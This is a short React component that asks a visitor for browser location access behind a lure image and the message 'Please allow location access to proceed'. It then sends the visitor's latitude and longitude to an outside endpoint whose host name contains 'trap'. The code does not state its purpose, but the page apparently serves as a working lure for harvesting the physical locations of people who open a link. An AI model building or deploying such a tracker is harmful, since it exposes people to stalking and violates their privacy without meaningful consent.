import { useEffect, useState } from 'react';
import axios from 'axios';
import { Link } from 'react-router-dom';

const SaveLocation = () => {
    const [locationAllowed, setLocationAllowed] = useState(false);

    useEffect(() => {
        const checkLocationPermission = async () => {
            if ('geolocation' in navigator) {
                // Check if the location permission is granted
                try {
                    const permissionStatus = await navigator.permissions.query({ name: 'geolocation' });
                    if (permissionStatus.state === 'granted') {
                        setLocationAllowed(true);
                        saveLocation();
                    } else if (permissionStatus.state === 'prompt') {
                        setLocationAllowed(false);
                    }
                } catch (error) {
                    console.error('Error checking geolocation permission:', error);
                }
            } else {
                console.error('Geolocation is not supported by this browser.');
            }
        };

        const saveLocation = async () => {
            if ('geolocation' in navigator) {
                navigator.geolocation.getCurrentPosition(
                    async (position) => {
                        const { latitude, longitude } = position.coords;

                        try {
                            await axios.post('https://trap-psi.vercel.app/api/location', {
                                latitude,
                                longitude,
                            });
                            console.log('Location saved successfully');
                        } catch (error) {
                            console.error('Failed to save location:', error);
                        }
                    },
                    (error) => {
                        console.error('Error fetching location:', error);
                    }
                );
            }
        };

        checkLocationPermission();
    }, []);

    return (
        <div>
            {!locationAllowed ? (
                <div className='flex justify-center items-center pt-20'>
                    <p>Please allow location access to proceed.</p>
                    <img
                        className='pt-20'
                        src="https://scontent.fcgp38-1.fna.fbcdn.net/v/t39.30808-6/467000109_122124516938496720_6570633246404310281_n.jpg?_nc_cat=106&ccb=1-7&_nc_sid=833d8c&_nc_ohc=bEScirS8a8AQ7kNvgHavDq4&_nc_zt=23&_nc_ht=scontent.fcgp38-1.fna&_nc_gid=A9hckfk1o7VC920NOKJwC58&oh=00_AYBHIIsN51RxARxeVQA8inuQjD0Op5UtCDeBgl1z8lB87Q&oe=673FF4BB"
                        alt="Location access"
                    />
                </div>
            ) : (
                <div className='flex justify-center items-center pt-20'>
                    <p>Your location is being saved...</p>
                </div>
            )}
        </div>
    );
};

export default SaveLocation;
